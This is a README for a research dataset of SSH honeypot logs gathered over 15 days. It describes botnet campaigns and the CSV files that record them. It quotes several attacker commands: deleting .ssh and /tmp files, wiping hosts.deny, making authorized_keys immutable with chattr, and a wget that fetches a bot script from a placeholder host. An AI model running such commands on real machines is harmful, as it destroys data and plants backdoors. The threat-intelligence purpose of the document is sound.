# SSH Honeypot Dataset: 15 Day Experiment

![Platform](https://img.shields.io/badge/platform-T--Pot%20Honeypot-orange) ![Data](https://img.shields.io/badge/data-24k%20Events-green)

![Commands Overtime](images/Command%20Overtime.png)

## 📌 Project Overview

This repository hosts a comprehensive cybersecurity dataset captured from a live **T-Pot Honeypot** deployment over a period of 15 days (November 15 – November 30, 2025).

The primary objective of this research was to quantify the "background radiation" of the internet and measure the **Time-to-Compromise** for a publicly exposed management interface. To conduct this experiment, a standard **Hetzner Cloud VPS** was provisioned, and the SSH port (22) was intentionally exposed to the public internet.

**The Result:** It took **less than 10 minutes** for the first automated attack to breach the server and attempt to deploy a crypto-mining rootkit.

### 🎯 Research Goals
1.  **Quantify Risk:** Measure how quickly an unsecured server is discovered.
2.  **Analyze TTPs:** Catalog the Tactics, Techniques, and Procedures used by modern botnets.
3.  **Identify Campaigns:** Fingerprint specific botnet families (RedTail, Mdrfckr, BillGates).

---

## 📊 Key Statistics (15-Day Capture)

| Metric | Count | Context |
| :--- | :--- | :--- |
| **Total Connection Attempts** | **298,000+** | Total TCP handshakes initiated against Port 22. |
| **Interactive Events** | **24,297** | Successful logins followed by shell command execution. |
| **Unique Attackers** | **771** | Distinct IP addresses identified as malicious actors. |
| **Time-to-Compromise** | **<10 Minutes** | Time elapsed between server boot and first payload drop. |
| **Top Attack Vector** | **SSH Key Injection** | 80% of attacks attempted to inject a specific backdoor key. |

---

## 🔍 Threat Intelligence: Identified Campaigns

Analysis of the captured logs revealed highly coordinated botnet activity. This was not random "script kiddie" behavior; it was an automated war for resources.

### ⚔️ 1. The "Turf Wars" (Bot Killers)
Attackers aggressively competed for CPU cycles. I observed multiple scripts specifically designed to "sanitize" the host of competing malware to maximize their own mining efficiency.
* **Signature:** `pkill -9 secure.sh`, `rm -rf /tmp/.X11-unix`
* **Scorched Earth:** Attackers ran `echo > /etc/hosts.deny` to block all future connections, effectively locking the door behind them.

### 🤖 2. The "Mdrfckr" Botnet (Persistence)
* **Scale:** Accounted for ~80% of all interactive attacks (621 Unique IPs).
* **Tactic:** Wiped the victim's existing `.ssh` directory (`rm -rf .ssh`) and injected a specific public key signed with the comment `mdrfckr`.
* **Goal:** To establish a permanent backdoor and lock out the legitimate administrator.

### ⛏️ 3. RedTail Crypto-Miner
* **Sophistication:** Utilized **SFTP** to bypass standard WAFs and dropped multi-architecture payloads (`redtail.arm7`, `redtail.x86_64`) to ensure compatibility with any CPU.
* **Defense Evasion:** Used `chattr +ai` to make the `authorized_keys` file immutable (God Mode), preventing root users from easily removing the backdoor.

### 🕵️ 4. The Fake SSHD (DDoS Recruitment)
* **Tactic:** Attackers uploaded a binary named `sshd` to disguise it as the legitimate SSH Daemon.
* **Reality:** Analysis of execution arguments revealed it was a DDoS bot (BillGates/Elknot variant) being fed a list of target IPs to attack.

---

## 📂 Dataset Documentation

This repository contains 6 CSV files exported from the ELK (Elasticsearch, Logstash, Kibana) stack. Below is a detailed breakdown of each file's contents and utility.

### 1. `List of All Commands (All Data).csv`
**Description:** The "Master" dataset. This contains every single logged event including session metadata, geolocation, and timestamps.
* **Rows:** ~24,000
* **Key Columns:**
    * `@timestamp`: Precise time of the event (ISO 8601).
    * `eventid`: Type of interaction (e.g., `cowrie.command.input`, `cowrie.session.file_download`).
    * `input`: The raw command string executed by the attacker.
    * `src_ip`: Attacker IP address.
    * `geoip.*`: Full enrichment (ASN, Organization, City, Country, Coordinates).
    * `session`: Unique ID linking multiple commands to one session.
* **Use Case:** Full forensic timeline reconstruction and behavioral profiling.

### 2. `List of Commands.csv`
**Description:** A curated subset focused specifically on **interactive shell commands** and **file transfers**. It removes system noise to focus on the "Action on Objectives."
* **Key Columns:**
    * `input`: The command (e.g., `wget http://malicious.site/bot.sh`).
    * `url`: Source URL if a download was attempted.
    * `filename`: Name of files uploaded via SFTP (e.g., `redtail.arm7`).
    * `shasum`: SHA-256 hash of uploaded malware artifacts.
* **Use Case:** Ideal for training NLP (Natural Language Processing) models to detect malicious shell commands or generating IOC (Indicator of Compromise) lists.

### 3. `List of Attacker IP with Enrichment.csv`
**Description:** A list of the 771 unique attacker IPs, enriched with external reputation data.
* **Key Columns:**
    * `ipAddress`: The malicious IP.
    * `abuseConfidenceScore`: (0-100) Likelihood of the IP being malicious (sourced from AbuseIPDB/Censys).
    * `isp` / `usageType`: Distinguishes between **Data Center** (likely compromised servers) vs. **Residential** (likely IoT botnets).
    * `totalReports`: Number of times this IP has been reported globally.
* **Use Case:** Threat intelligence feed generation and analyzing the infrastructure source of botnets.

### 4. `Count of SSH commands.csv`
**Description:** A time-series aggregation showing the frequency of specific command strings grouped by 12-hour windows.
* **Key Columns:** `input.keyword`, `timestamp`, `Count`.
* **Use Case:** Visualizing campaign spikes (e.g., identifying when the "Mdrfckr" campaign wave started and ended).

### 5. `Count of activity per IP.csv`
**Description:** A high-level volume summary showing which IPs were the "noisiest."
* **Use Case:** Identifying "Scanner" bots (high volume, low sophistication) vs. "Targeted" attackers (low volume, specific commands).

### 6. `List of Attempted Usernames.csv`
**Description:** A log of the credentials used during the brute-force phase *before* access was gained.
* **Key Columns:** `username`, `timestamp`.
* **Use Case:** analyzing common default credentials used by botnets (e.g., `root`, `admin`, `ubnt`, `pi`).

---

## 🛠 Architecture & Reproduction

Researchers wishing to reproduce this experiment can utilize the following stack.

### Infrastructure
* **Provider:** [Hetzner Cloud](https://www.hetzner.com/)
* **Instance Type:** CPX21 (3 vCPU AMD EPYC, 4GB RAM)
* **OS:** Debian 11 (Bullseye)

### Software Stack (T-Pot)
The project utilized **[T-Pot 24.04](https://github.com/telekom-security/tpotce)**, the Universal Multi-Honeypot Platform by Deutsche Telekom Security.
* **Honeypot Core:** **Cowrie** (Medium interaction SSH/Telnet honeypot). Cowrie mimics a filesystem, allowing attackers to upload files and run commands without compromising the host OS.
* **Data Pipeline:**
    * **Cowrie:** Logs interaction to JSON.
    * **Logstash:** Ingests and enriches logs (GeoIP).
    * **Elasticsearch:** Stores indexed data.
    * **Kibana:** Visualization and CSV export.

### Reproduction Steps
1.  Rent a VPS with at least 4GB RAM.
2.  Install T-Pot:
    ```bash
    git clone [https://github.com/telekom-security/tpotce](https://github.com/telekom-security/tpotce)
    cd tpotce/iso/installer/
    ./install.sh --type=user
    ```
3.  Ensure Firewall allows Inbound TCP/22.
4.  **Wait.** (As this research proves, you won't wait long).

---

## ⚠️ Disclaimer & Safety
**DANGER:** This dataset contains live malware commands, malicious URLs, and IP addresses of actively compromised devices.
* **DO NOT** execute the commands found in the `input` columns on a production machine.
* **DO NOT** visit the URLs found in the dataset without a secure sandbox.
* This data is provided strictly for **educational and research purposes**.

---

## 📜 License & Credits
This dataset is released under the **MIT License**.

**Acknowledgments:**
* **[Deutsche Telekom Security](https://github.com/telekom-security)** for the T-Pot framework.
* **Hetzner Cloud** for the infrastructure.
